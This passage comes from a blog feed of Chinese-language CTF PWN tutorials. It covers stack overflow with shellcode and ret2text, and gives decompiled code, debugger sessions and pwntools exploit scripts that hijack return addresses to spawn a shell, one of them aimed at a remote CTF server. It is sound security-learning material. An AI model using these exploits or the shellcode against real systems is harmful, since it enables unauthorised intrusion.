class="number">99</span>                      cdq</span><br><span class="line">  <span class="number">15</span>:   0f 05                   syscall</span><br></pre></td></tr></table></figure><p>而shellcode中对sp进行了push操作，所以leave指令会对shellcode的执行造成影响。所以buf中不能存放shellcode，buf后的8个字节也不能存放（这里需要存放返回地址）。</p><p>所以，我们的shellcode只能放在buf首地址后的0x10+8后的地址。</p><p><code>编写exp</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./sniperoj-pwn100-shellcode-x86-64&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#print type(buf_addr)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>) + <span class="number">32</span>) + shellcode<span class="comment">#buf占0x10（16）字节→覆盖 saved rbp占8字节→返回地址占8字节→所以shellcode起始地址=buf_addr+0x10(buf)+8(saved rbp)+8(返回地址)=buf_addr+32（0x10=16，16+8+8=32）</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">程序栈帧结构：</span><br><span class="line">高地址</span><br><span class="line">+---------------------------+</span><br><span class="line">|  其他函数栈帧/环境变量        |</span><br><span class="line">+---------------------------+</span><br><span class="line">|  saved rbp (旧rbp值)       |  ← rbp 原始位置（占8字节，x64下）</span><br><span class="line">+---------------------------+</span><br><span class="line">|  buf (用户输入缓冲区)        |  ← 大小 0x10（16字节）</span><br><span class="line">+---------------------------+</span><br><span class="line">|  栈底/低地址                |</span><br><span class="line">→→</span><br><span class="line">高地址</span><br><span class="line">+---------------------------+</span><br><span class="line">|  A*0x10 (buf)             |</span><br><span class="line">+---------------------------+</span><br><span class="line">|  A*8 (saved rbp)          |</span><br><span class="line">+---------------------------+</span><br><span class="line">|  p64(目标地址)              |  ← 返回地址：程序执行完当前函数后，跳转到这里</span><br><span class="line">+---------------------------+</span><br><span class="line">|  shellcode                |  ← 实际要执行的恶意代码</span><br><span class="line">+---------------------------+</span><br><span class="line">|  低地址                    |</span><br></pre></td></tr></table></figure><h2 id="例六"><a href="#例六" class="headerlink" title="例六"></a>例六</h2><blockquote><p>点击下载: <a href="../../../../../../../challeges/show_shellcode">show_shellcode</a></p></blockquote><p>Checksec 查看保护</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
          <category> 3-基本ROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1-ret2text</title>
      <link href="/2025/07/b470f1e84375.html"/>
      <url>/2025/07/b470f1e84375.html</url>
      
        <content type="html"><![CDATA[<p>随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。</p><p>目前被广泛使用的攻击手法是 <strong>返回导向编程</strong> (Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>gadgets 通常是以 <code>ret</code> 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p><p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p><p>使用 ROP 攻击一般得满足如下条件：</p><ul><li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p><p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p><blockquote><p>点击下载: <a href="../../../../../../../challenges/ret2text">ret2text</a></p></blockquote><p>首先，查看一下程序的保护机制：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。接下来查看反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485FD secure          proc near</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD input           = dword ptr -10h</span><br><span class="line">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD ; __unwind &#123;</span><br><span class="line">.text:080485FD                 push    ebp</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 <code>system(&quot;/bin/sh&quot;)</code> 的代码，那么如果我们直接控制程序返回至 <code>0x0804863A</code> ，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae <span class="keyword">in</span> main () at ret2text.c:24</span><br><span class="line">warning: 24ret2text.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line"> EAX  0xffb62afc ◂— 0</span><br><span class="line"> EBX  0xf52dae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0xf52dc8a0 (_IO_stdfile_1_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf532cb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffb62b68 ◂— 0</span><br><span class="line"> ESP  0xffb62ae0 —▸ 0xffb62afc ◂— 0</span><br><span class="line"> EIP  0x80486ae (main+102) ◂— call gets@plt</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffb62ae0，ebp 为 0xffb62b68，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断：</p><ul><li>s 的地址为 0xffb62afc</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; cyclic 512</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; 回车</span><br><span class="line">pwndbg&gt; </span><br><span class="line">00:0000│ esp 0xffa5f5cc ◂— 0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">01:0004│     0xffa5f5d0 ◂— 0x62616165 (<span class="string">&#x27;eaab&#x27;</span>)</span><br><span class="line">02:0008│     0xffa5f5d4 ◂— 0x62616166 (<span class="string">&#x27;faab&#x27;</span>)</span><br><span class="line">03:000c│     0xffa5f5d8 ◂— 0x62616167 (<span class="string">&#x27;gaab&#x27;</span>)</span><br><span class="line">04:0010│     0xffa5f5dc ◂— 0x62616168 (<span class="string">&#x27;haab&#x27;</span>)</span><br><span class="line">05:0014│     0xffa5f5e0 ◂— 0x62616169 (<span class="string">&#x27;iaab&#x27;</span>)</span><br><span class="line">06:0018│     0xffa5f5e4 ◂— 0x6261616a (<span class="string">&#x27;jaab&#x27;</span>)</span><br><span class="line">07:001c│     0xffa5f5e8 ◂— 0x6261616b (<span class="string">&#x27;kaab&#x27;</span>)</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure><p>因此最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><blockquote><p>点击下载: <a href="../../../../../../../challenges/Ret2text1">Ret2text</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">→ checksec Ret2text</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位，启用了栈执行保护，进一步增强 NX 机制，明确禁止栈内存执行代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dt_gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lol,you get dt&#x27;s gitf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004011A4                 public dt_gift</span><br><span class="line">.text:00000000004011A4 dt_gift         proc near</span><br><span class="line">.text:00000000004011A4 ; __unwind &#123;</span><br><span class="line">.text:00000000004011A4                 endbr64</span><br><span class="line">.text:00000000004011A8                 push    rbp</span><br><span class="line">.text:00000000004011A9                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011AC                 lea     rax, s          ; &quot;lol,you get dt&#x27;s gitf&quot;</span><br><span class="line">.text:00000000004011B3                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011B6                 call    _puts</span><br><span class="line">.text:00000000004011BB                 lea     rax, command    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004011C2                 mov     rdi, rax        ; command</span><br><span class="line">.text:00000000004011C5                 mov     eax, 0</span><br><span class="line">.text:00000000004011CA                 call    _system</span><br><span class="line">.text:00000000004011CF                 nop</span><br><span class="line">.text:00000000004011D0                 pop     rbp</span><br><span class="line">.text:00000000004011D1                 retn</span><br><span class="line">.text:00000000004011D1 ; &#125; // starts at 4011A4</span><br><span class="line">.text:00000000004011D1 dt_gift         endp</span><br><span class="line">.text:00000000004011D1</span><br><span class="line">.text:00000000004011D1 _text           ends</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./Ret2text&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20138</span>)</span><br><span class="line">addr=<span class="number">0x4011BB</span>  </span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><blockquote><p>点击下载: <a href="../../../../../../../challenges/ez_pwn">ez_pwn</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看出程序是64位小端程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Guess what I think!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;233 or 666&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">233</span> )</span><br><span class="line">    sub_400726();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">    sub_400737();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">5438</span> )</span><br><span class="line">    sub_400748(<span class="number">5438</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输入5438后会进入 sub_400748</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400748</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You find my secret!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So,Tell me your name!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  result = <span class="built_in">printf</span>(<span class="string">&quot;I have remembered you, %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">233</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出漏洞，且有 system(“&#x2F;bin&#x2F;sh”)[a1&#x3D;0xe9即可得到],buf 距离 rbp 存在有0x20个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400748 sub_400748      proc near               ; CODE XREF: main+91↓p</span><br><span class="line">.text:0000000000400748</span><br><span class="line">.text:0000000000400748 var_24          = dword ptr -24h</span><br><span class="line">.text:0000000000400748 buf             = byte ptr -20h</span><br><span class="line">.text:0000000000400748</span><br><span class="line">.text:0000000000400748 ; __unwind &#123;</span><br><span class="line">.text:0000000000400748                 push    rbp</span><br><span class="line">.text:0000000000400749                 mov     rbp, rsp</span><br><span class="line">.text:000000000040074C                 sub     rsp, 30h</span><br><span class="line">.text:0000000000400750                 mov     [rbp+var_24], edi</span><br><span class="line">.text:0000000000400753                 mov     edi, offset aYouFindMySecre ; &quot;You find my secret!&quot;</span><br><span class="line">.text:0000000000400758                 call    _puts</span><br><span class="line">.text:000000000040075D                 mov     edi, offset aSoTellMeYourNa ; &quot;So,Tell me your name!&quot;</span><br><span class="line">.text:0000000000400762                 call    _puts</span><br><span class="line">.text:0000000000400767                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000040076B                 mov     edx, 50h ; &#x27;P&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400770                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400773                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400778                 mov     eax, 0</span><br><span class="line">.text:000000000040077D                 call    _read</span><br><span class="line">.text:0000000000400782                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400786                 mov     rsi, rax</span><br><span class="line">.text:0000000000400789                 mov     edi, offset format ; &quot;I have remembered you, %s&quot;</span><br><span class="line">.text:000000000040078E                 mov     eax, 0</span><br><span class="line">.text:0000000000400793                 call    _printf</span><br><span class="line">.text:0000000000400798                 cmp     [rbp+var_24], 0E9h</span><br><span class="line">.text:000000000040079F                 jnz     short loc_4007AB</span><br><span class="line">.text:00000000004007A1                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004007A6                 call    _system</span><br><span class="line">.text:00000000004007AB</span><br><span class="line">.text:00000000004007AB loc_4007AB:                             ; CODE XREF: sub_400748+57↑j</span><br><span class="line">.text:00000000004007AB                 nop</span><br><span class="line">.text:00000000004007AC                 leave</span><br><span class="line">.text:00000000004007AD                 retn</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">低地址</span><br><span class="line">+-----------------+</span><br><span class="line">| ...             | </span><br><span class="line">+-----------------+</span><br><span class="line">| buf[31]         |  &lt;-- rbp-0x20 + 31</span><br><span class="line">| ...             |</span><br><span class="line">| buf[0]          |  &lt;-- rbp-0x20 (buf起始位置)</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的RBP        |  &lt;-- rbp (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">| 返回地址         |  &lt;-- rbp+0x8</span><br><span class="line">+-----------------+</span><br><span class="line">| ...             |</span><br><span class="line">+-----------------+     </span><br><span class="line">高地址</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line">binsh_addr=<span class="number">0x4007a1</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;5438&#x27;</span>)</span><br><span class="line">buf_padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">31</span> + <span class="string">b&#x27;\x00&#x27;</span>  <span class="comment"># 填充buf (32字节), 末尾\x00防止printf乱码</span></span><br><span class="line">rbp_value = p64(<span class="number">0x601040</span>)   <span class="comment">#典型的.bss段起始地址（可通过readelf -S ./binary确认）</span></span><br><span class="line">return_addr = p64(binsh_addr)      <span class="comment"># 覆盖返回地址为system调用处</span></span><br><span class="line">payload = buf_padding + rbp_value + return_addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)  </span><br><span class="line">system_addr = <span class="number">0x4007A1</span>  <span class="comment"># system(&quot;/bin/sh&quot;)地址</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;5438&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>      <span class="comment"># 填充buf (32字节)</span></span><br><span class="line">payload += p64(<span class="number">1</span>)        <span class="comment"># 覆盖RBP (任意值)</span></span><br><span class="line">payload += p64(system_addr) <span class="comment"># 覆盖返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>64 位程序，需要处理堆栈平衡<br><code>堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。</code></p><p>64 位程序的ROP链</p><p>程序执行完 <code>pop rdi; ret</code> 后：</p><ul><li><p><code>pop rdi</code> 把 <code>&quot;/bin/sh&quot;</code> 地址拿给 <code>rdi</code>。</p></li><li><p><code>ret</code> 自动去栈顶取下一条指令地址，正好就是 <code>system()</code>。</p></li><li><p><code>system()</code> 一看 <code>rdi</code> 里是 <code>&quot;/bin/sh&quot;</code>，就执行它，shell 就出来</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">|-----------------------| &lt;-- 栈底 (高地址)</span><br><span class="line">| ....(程序原有数据) .....|</span><br><span class="line">|-----------------------|</span><br><span class="line">| 返回地址 (被覆盖)        | --&gt; 指向 pop rdi; ret (0x4011d2) &lt;-- 你覆盖的</span><br><span class="line">|-----------------------|</span><br><span class="line">| 参数1 (给 pop rdi)     | --&gt; &quot;/bin/sh&quot; 地址 (0x601000)    &lt;-- 你放的</span><br><span class="line">|-----------------------|</span><br><span class="line">| 返回地址 (给 pop rdi 之后的 ret) | --&gt; 指向 system() (0x400530) &lt;-- 你放的</span><br><span class="line">|-----------------------|</span><br><span class="line">| ... (可能还有更多) .... |</span><br><span class="line">|-----------------------|</span><br><span class="line">| b&#x27;A&#x27; * 32             | &lt;-- 填充的垃圾数据               &lt;-- 你放的</span><br><span class="line">|-----------------------| &lt;-- 栈顶 (低地址) - 你的输入从这里开始</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
          <category> 3-基本ROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/7070f1e7a12f.html"/>
      <url>/2025/07/7070f1e7a12f.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 3-ELF 文件链接 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/a0bfb9c20b31.html"/>
      <url>/2025/07/a0bfb9c20b31.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 3-ELF 文件链接 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/e95b91c59fd3.html"/>
      <url>/2025/07/e95b91c59fd3.html</url>
      
        <content type="html"><![CDATA[<p>title: 可执行文件装载与虚拟内存<br>date: 2025-06-28 20:16:36<br>categories:   - PWN -ELF文件格式</p><p>tags: </p><p><img src="/./../../../../../images/image-20250629232102031.png" alt="image-20250629232102031"></p><p><img src="/./../../../../../images/image-20250629232917087.png" alt="image-20250629232917087"></p><p><img src="/./../../../../../images/image-20250629233100682.png" alt="image-20250629233100682"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 2-ELF文件格式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/bf16778323fb.html"/>
